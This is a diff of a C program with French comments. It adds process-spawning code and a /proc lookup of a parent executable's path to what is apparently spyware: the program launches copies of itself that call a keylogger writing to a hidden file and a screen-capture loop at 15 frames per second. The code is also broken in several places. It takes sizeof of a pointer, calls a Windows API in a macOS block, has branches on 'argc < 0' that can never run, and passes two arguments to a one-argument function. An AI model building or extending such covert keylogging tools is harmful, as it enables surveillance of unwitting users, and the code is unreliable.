@@ -11,26 +11,80 @@ const char *output_file = ".output_text.txt";
 #include <stdlib.h>
 #include <unistd.h>
 
-int main() {
-    pid_t pid;
+#define MAX_PATH 1024
 
-    pid = fork();  // Créer un nouveau processus
+void start(char *path){
+
+    pid_t pid = fork();  // Créer un processus enfant
+
     if (pid < 0) {
-        // Échec de fork
-        perror("Erreur de fork");
+        // En cas d'erreur
+        perror("fork");
         exit(1);
     }
 
     if (pid == 0) {
-        // Processus enfant
-        char *args[] = {"/chemin/vers/ton/programme", "1"};  // Remplace par ton programme et arguments
-        execvp(args[0], args);  // Exécute le programme avec les arguments
-        perror("Erreur de execvp");  // Si execvp échoue
-        exit(1);
+        // Code du processus enfant
+        printf("Le processus enfant commence à exécuter une commande.\n");
+
+        // Exemple de commande avec arguments
+        char *args[] = {"ls", "-l", "/home", NULL};
+
+        // Remplacer le processus enfant par "ls -l /home"
+        if (execvp(args[0], args) == -1) {
+            // Si execvp échoue, afficher un message d'erreur
+            perror("execvp échoué");
+            exit(1);  // Terminer l'enfant si exec échoue
+        }
     } else {
-        // Processus parent attend que l'enfant se termine
-        wait(NULL);
+        // Code du processus parent
+        printf("Le processus parent continue sans attendre l'enfant.\n");
+
+        // Le parent peut faire autre chose ici (par exemple, attendre que l'enfant se termine)
+        // sans être bloqué
     }
+
+}
+
+// Fonction pour récupérer le chemin d'un processus à partir de son PID
+void get_parent_path(pid_t pid, char *path) {
+    FILE *fp;
+    char parent_pid[20];
+    char proc_path[MAX_PATH];
+
+    // Obtenir le PID du parent
+    snprintf(path, sizeof(path), "/proc/%d/stat", pid);
+    fp = fopen(path, "r");
+    if (fp == NULL) {
+        perror("fopen");
+        return;
+    }
+
+    // Lire l'ID du parent à partir du fichier stat (le PPid est dans la 4ème colonne)
+    if (fscanf(fp, "%*d %*s %*c %s", parent_pid) != 1) {
+        perror("fscanf");
+        fclose(fp);
+        return;
+    }
+    fclose(fp);
+
+    // Obtenir le chemin du programme du parent à partir de /proc/[PPID]/exe
+    snprintf(proc_path, sizeof(proc_path), "/proc/%s/exe", parent_pid);
+    ssize_t len = readlink(proc_path, path, sizeof(path) - 1);
+    if (len == -1) {
+        perror("readlink");
+        return;
+    }
+
+    path[len] = '\0';  // Ajouter le caractère de fin de chaîne
+    printf("Le chemin du parent est: %s\n", path);
+}
+
+int main() {
+    pid_t pid = getpid();
+    char path[MAX_PATH];
+
+    get_parent_path(pid, path);    
 
     return 0;
 };
@@ -40,6 +94,28 @@ int main() {
 
 #ifdef __APPLE__
 
+int main(int argc, char *argv[]) {
+    char path[MAX_PATH];
+
+    // Récupérer le chemin de l'exécutable
+    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
+        printf("Erreur lors de la récupération du chemin de l'exécutable\n");
+        return 1;
+    }
+
+    if (argc < 0){
+        start(path, "1");
+        start(path, "2");
+
+    } else if (argc < 0) {
+        if (strcmp(argv[0], "1") == 0){
+            start_keylogger(output_file);
+        }
+        else {
+            capture_screen_at_fps(15, output_dir);
+        }
+    }
+}
 
 #endif
 
@@ -98,7 +174,9 @@ int main(int argc, char *argv[]) {
     if (argc < 0){
         start(path, "1");
         start(path, "2");
-        
+
+
+
     } else if (argc < 0) {
         if (strcmp(argv[0], "1") == 0){
             start_keylogger(output_file);
